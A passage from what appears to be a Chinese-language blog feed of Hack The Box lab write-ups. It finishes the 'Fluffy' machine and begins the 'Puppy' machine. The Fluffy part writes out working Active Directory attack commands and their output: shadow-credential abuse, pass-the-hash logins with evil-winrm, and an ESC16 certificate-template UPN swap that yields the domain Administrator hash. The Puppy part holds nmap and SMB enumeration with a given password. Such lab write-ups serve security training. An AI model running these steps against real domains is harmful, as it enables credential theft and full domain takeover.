KeyFlags.NONE</span><br><span class="line">  |  | VolumeType: None</span><br><span class="line">  |  | SupportsNotification: None</span><br><span class="line">  |  | FekKeyVersion: None</span><br><span class="line">  |  | Strength: None</span><br><span class="line">  |  | Reserved: None</span><br><span class="line">  |  | EncodedExtendedCKI: None</span><br><span class="line">  | LastLogonTime (UTC): 2025-07-27 18:09:41.322062</span><br><span class="line">  | CreationTime (UTC): 2025-07-27 18:09:41.322062</span><br><span class="line">[+] Key Credential: B:828:000200002000013b1ab8ff85b67f8dd7093b0b8f51e21bc71aedd28d24613b26a057aae41fa8de2000028a412cd101147142e8adc9245b594b8a059bd3a65c9df02765f9536432dad1601b0103525341310008000003000000000100000000000000000000010001cf126d263713ac29300f96235d6e90062a24b425deaf92ab717b9052859dc9e985ab98bacdedc98386c85a64eafa70a6f820cd2389c3fdf83f788f6ad30262c7e733f504f573c2f4c38694307b00581cf10dffc4150895ad9ebe63209c0d04443f2f3049579d8af853c29630eae2f5774d7014fc2e3b971143ce61b3b6202143bc0521bbb5a4431c67d22ff444d6ef98eed6be73c01456b076863d1a1de92edeb50bff4660fa3e5b8e0fc40b3fd19809648b010589e2733da0949de1c0a0c9723c7914b2e52ca6235452e226c1e98f69b47db6cd7e2da0e2f23d62cac8f4a0a1effc6833cdd34fb7f9ccfd481c87a03eedcec5d271e32b9de1674ac081e321c10100040101000500100006d253355db481708fe7adbc195c5a218d0200070100080008f9848a9f21ffdb01080009f9848a9f21ffdb01:CN=winrm service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27; to the Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;winrm_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: winrm_svc@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;winrm_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;winrm_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;winrm_svc&#x27;: 33bd09dcd697600edf6b3a7af4875767</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功获取了 <code>WINRM_SVC</code> 用户的 NT 哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.69 -u &#x27;WINRM_SVC&#x27; -H &#x27;33bd09dcd697600edf6b3a7af4875767&#x27;</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc&gt; cd desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\desktop&gt; type user.txt</span><br><span class="line">cc89*****************</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功拿到userflag</p><p>我们再拿一下ca_svc用户的hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ntpdate 10.10.11.69</span><br><span class="line">2025-07-27 16:15:49.117859 (-0400) +3381.164582 +/- 0.336972 10.10.11.69 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 3381.164582</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad shadow auto -debug -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account &#x27;ca_svc&#x27; -target dc01.fluffy.htb -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;dc01.fluffy.htb&#x27; at &#x27;10.10.11.69&#x27;</span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Bound to ldaps://10.10.11.69:636 - ssl</span><br><span class="line">[+] Default path: DC=fluffy,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">[*] Targeting user &#x27;ca_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27;</span><br><span class="line">&lt;KeyCredential structure at 0x7f66a40bfc50&gt;</span><br><span class="line">  | Owner: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">  | Version: 0x200</span><br><span class="line">  | KeyID: Ohnn3EPYflTVG80nuKy52xET0rM7YCqLDT+uamRAOEk=</span><br><span class="line">  | KeyHash: 2910c4f1a2f7374ae1d67e14e8f51e69a2959c80331fc0aafe4da485ebc2d3a9</span><br><span class="line">  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7f66a40bf9d0&gt;</span><br><span class="line">  |  | Exponent (E): 65537</span><br><span class="line">  |  | Modulus (N): 0xe4956bc832b77c9484d8603b4001ca7147376c1a6d0a2165d594426c6417a28a699b78d2a59ee4f7db2b819355ae393bc4878bc3e6a65ba048a3681353774f70c6b3b1d98736ba0e6c7fbeb92799b05bac509f492ed3919299e9debfab73fb9d93226fc3d482139d8e2d8e1eb36f1a8f694e5663ddbddd3afb836eda776a39b221feace0215c18ca49de8761b08383680bc34a6de86d6d5767bb7ca20d12886fe231a06909931422e2f68808fc7a84eb1ebccb509eeec07f212c17b3e2687625edcc35f47c39d0b9d9f0bec40b33218f598389c83c5cfa3211f4a6db8fa77848b75c0cae54bab7e6d68483495c1a716652a335973eae8eec54db8aa47b63ec6b</span><br><span class="line">  |  | Prime1 (P): 0x0</span><br><span class="line">  |  | Prime2 (Q): 0x0</span><br><span class="line">  | Usage: KeyUsage.NGC</span><br><span class="line">  | LegacyUsage: None</span><br><span class="line">  | Source: KeySource.AD</span><br><span class="line">  | DeviceId: 0e40c569-4e25-5ca5-c416-b04df7c3dd51</span><br><span class="line">  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7f66a3d5fc50&gt;</span><br><span class="line">  |  | Version: 1</span><br><span class="line">  |  | Flags: KeyFlags.NONE</span><br><span class="line">  |  | VolumeType: None</span><br><span class="line">  |  | SupportsNotification: None</span><br><span class="line">  |  | FekKeyVersion: None</span><br><span class="line">  |  | Strength: None</span><br><span class="line">  |  | Reserved: None</span><br><span class="line">  |  | EncodedExtendedCKI: None</span><br><span class="line">  | LastLogonTime (UTC): 2025-07-27 20:17:15.073256</span><br><span class="line">  | CreationTime (UTC): 2025-07-27 20:17:15.073256</span><br><span class="line">[+] Key Credential: B:828:000200002000013a19e7dc43d87e54d51bcd27b8acb9db1113d2b33b602a8b0d3fae6a644038492000022910c4f1a2f7374ae1d67e14e8f51e69a2959c80331fc0aafe4da485ebc2d3a91b0103525341310008000003000000000100000000000000000000010001e4956bc832b77c9484d8603b4001ca7147376c1a6d0a2165d594426c6417a28a699b78d2a59ee4f7db2b819355ae393bc4878bc3e6a65ba048a3681353774f70c6b3b1d98736ba0e6c7fbeb92799b05bac509f492ed3919299e9debfab73fb9d93226fc3d482139d8e2d8e1eb36f1a8f694e5663ddbddd3afb836eda776a39b221feace0215c18ca49de8761b08383680bc34a6de86d6d5767bb7ca20d12886fe231a06909931422e2f68808fc7a84eb1ebccb509eeec07f212c17b3e2687625edcc35f47c39d0b9d9f0bec40b33218f598389c83c5cfa3211f4a6db8fa77848b75c0cae54bab7e6d68483495c1a716652a335973eae8eec54db8aa47b63ec6b010004010100050010000669c5400e254ea55cc416b04df7c3dd5102000701000800081145887133ffdb010800091145887133ffdb01:CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">[*] Adding Key Credential with device ID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully added Key Credential with device ID &#x27;0e40c569-4e25-5ca5-c416-b04df7c3dd51&#x27; to the Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Authenticating as &#x27;ca_svc&#x27; with the certificate</span><br><span class="line">[*] Using principal: ca_svc@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;ca_svc.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Restoring the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] Successfully restored the old Key Credentials for &#x27;ca_svc&#x27;</span><br><span class="line">[*] NT hash for &#x27;ca_svc&#x27;: ca0f4f9e9eb8a092addf53bb03fc98c8</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="CA-证书模板漏洞攻击-ESC16"><a href="#CA-证书模板漏洞攻击-ESC16" class="headerlink" title="CA 证书模板漏洞攻击 - ESC16"></a>CA 证书模板漏洞攻击 - ESC16</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─#certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</span><br><span class="line"></span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 33 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 11 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA: Could not connect: timed out</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration for &#x27;fluffy-DC01-CA&#x27;</span><br><span class="line">[*] Saved BloodHound data to &#x27;20250727150414_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to &#x27;20250727150414_Certipy.txt&#x27;</span><br><span class="line">[*] Saved JSON output to &#x27;20250727150414_Certipy.json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>CA 名称:fluffy-DC01-CA</p><p>可将zip导入bloodhound观察进攻线路</p><p>以 <code>ca_svc</code> 用户的身份和哈希，向 <code>fluffy-DC01-CA</code> 请求一个基于 <code>User</code> 模板的证书。获得一个冒充 <code>Administrator</code> 用户的数字证书和私钥。</p><p>使用刚刚获得的 <code>administrator.pfx</code> 证书，尝试以 <code>administrator</code> 用户的身份对 <code>fluffy.htb</code> 域进行身份验证,获得hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# export KRB5CCNAME=ca_svc.ccache</span><br><span class="line"> //设置环境变量 KRB5CCNAME，指向 ca_svc 用户的 Kerberos 凭据缓存文件。                                                                                                                                                          </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad account -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -upn &#x27;administrator&#x27; -user &#x27;ca_svc&#x27; update</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_svc&#x27;:</span><br><span class="line">    userPrincipalName                   : administrator</span><br><span class="line">[*] Successfully updated &#x27;ca_svc&#x27;</span><br><span class="line">                                                                                                             </span><br><span class="line">// 使用 ca_svc 的哈希，将 ca_svc 账户的 userPrincipalName (UPN) 属性修改为 administrator。                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ntpdate 10.10.11.69</span><br><span class="line">2025-07-28 08:48:45.139284 (-0400) +47.012763 +/- 0.096627 10.10.11.69 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 47.012763</span><br><span class="line">                                                                                                             // 再次同步 Kali Linux 机器的时间与目标域控制器的时间。                                                                                                </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad req -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -target &#x27;DC01.fluffy.htb&#x27; -ca &#x27;fluffy-DC01-CA&#x27; -template &#x27;User&#x27;</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 24</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">                                                                                                              // 以 ca_svc 用户的身份和哈希，向 fluffy-DC01-CA 请求一个基于 User 模板的证书。                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad account -u &#x27;ca_svc&#x27; -hashes &#x27;:ca0f4f9e9eb8a092addf53bb03fc98c8&#x27; -dc-ip 10.10.11.69 -upn &#x27;ca_svc@fluffy.htb&#x27; -user &#x27;ca_svc&#x27; update </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Updating user &#x27;ca_svc&#x27;:</span><br><span class="line">    userPrincipalName                   : ca_svc@fluffy.htb</span><br><span class="line">[*] Successfully updated &#x27;ca_svc&#x27;</span><br><span class="line">                                                                                                              //在成功获取证书后，将 ca_svc 账户的 userPrincipalName (UPN) 属性恢复到其原始的 ca_svc@fluffy.htb,避免在 Active Directory 中留下可疑的 UPN 更改                                             </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad auth -pfx administrator.pfx -username &#x27;administrator&#x27; -domain &#x27;fluffy.htb&#x27; -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@fluffy.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@fluffy.htb&#x27;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e</span><br><span class="line">                                                                                                             //使用刚刚获得的 administrator.pfx 证书，尝试以 administrator 用户的身份对 fluffy.htb 域进行身份验证。获取了 Administrator 用户的 NTLM 哈希                                                                                 </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# evil-winrm -i 10.10.11.69 -u administrator -H &#x27;8da83a3fa618b6e3a00e93f676c92a6e&#x27; </span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; cd desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; type root.txt</span><br><span class="line">fbb4e8*************************</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br><span class="line">//得到rootflag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>htb-season8.1-puppy</title>
      <link href="/2025/07/28/htb-season8-1-puppy/"/>
      <url>/2025/07/28/htb-season8-1-puppy/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250723155210324.png" alt="image-20250723155210324"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# nmap -p- --min-rate 10000 -oN ports.txt 10.10.11.70</span><br><span class="line">Nmap scan report for 10.10.11.70</span><br><span class="line">Host is up (0.19s latency).</span><br><span class="line">Not shown: 65516 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">3260/tcp  open  iscsi</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49692/tcp open  unknown</span><br><span class="line">62521/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds                                                            </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -sCV -p- --min-rate 10000 10.10.11.70</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 04:03 EDT</span><br><span class="line">Host is up (0.18s latency).</span><br><span class="line">Not shown: 65515 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 14:40:50Z)</span><br><span class="line">111/tcp   open  rpcbind       2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|_  100024  1           2049/udp   status</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49692/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">62492/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">62521/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-07-23T14:41:51</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 6h36m23s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 144.86 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给的用户名并不能进行WinRM（5985）登陆</p><p>smb利用一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# smbmap -H 10.10.11.70 -u &quot;levi.james&quot; -p &#x27;KingofAkron2025!&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\</span><br><span class="line">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="line">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="line">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="line">   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          </span><br><span class="line">The NETBIOS connection with the remote host timed out.                                                                       </span><br><span class="line">The NETBIOS connection with the remote host timed out.                                                                       </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.10.11.70:445 Name: 10.10.11.70               Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS</span><br><span class="line">        IPC$                                                    NO ACCESS       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        SYSVOL                                                  NO ACCESS       Logon server share </span><br><span class="line">[*] Closed 1 connections      </span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# crackmapexec smb 10.10.11.70 -u &quot;levi.james&quot; -p &quot;KingofAkron2025\!&quot; --users</span><br><span class="line">SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! </span><br><span class="line">SMB         10.10.11.70     445    DC               [+] Enumerated domain user(s)</span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\steph.cooper_adm               badpwdcount: 2 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\steph.cooper                   badpwdcount: 5 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\jamie.williams                 badpwdcount: 5 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\adam.silver                    badpwdcount: 1 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\ant.edwards                    badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\levi.james                     badpwdcount: 0 desc: </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account</span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                                                                                                            </span><br><span class="line">SMB         10.10.11.70     445    DC               PUPPY.HTB\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain   </span><br></pre></td></tr></table></figure><p>去看一下共享目录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/1]</span><br><span class="line">└─# smbclient //10.10.11.70/NETLOGON -U &quot;levi.james&quot;</span><br><span class="line"></span><br><span class="line">Password for [WORKGROUP\levi.james]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Fri Mar 21 01:33:44 2025</span><br><span class="line">  ..                                  D        0  Wed Feb 19 06:46:56 2025</span><br><span class="line"></span><br><span class="line">                5080575 blocks of size 4096. 1632326 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>什么都没有</p><p>域名加入host文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10.10.11.70   dc.puppy.htb dc puppy.htb</span><br></pre></td></tr></table></figure><p>smb探测</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/1/1]</span><br><span class="line">└─# smbmap -H 10.10.11.70 -u &quot;levi.james&quot; -p &#x27;KingofAkron2025!&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\</span><br><span class="line">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="line">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="line">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="line">   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt;</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB                                                                                                  </span><br><span class="line">[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          </span><br><span class="line">                                                                                                                             </span><br><span class="line">[+] IP: 10.10.11.70:445 Name: dc.puppy.htb              Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        ADMIN$                                                  NO ACCESS       Remote Admin</span><br><span class="line">        C$                                                      NO ACCESS       Default share</span><br><span class="line">        DEV                                                     NO ACCESS       DEV-SHARE for PUPPY-DEVS</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        NETLOGON                                                READ ONLY       Logon server share </span><br><span class="line">        SYSVOL                                                  READ ONLY       Logon server share </span><br><span class="line">[*] Closed 1 connections                                                                                                   </span><br></pre></td></tr></table></figure><h4 id="bloodhoudn攻击路线分析"><a 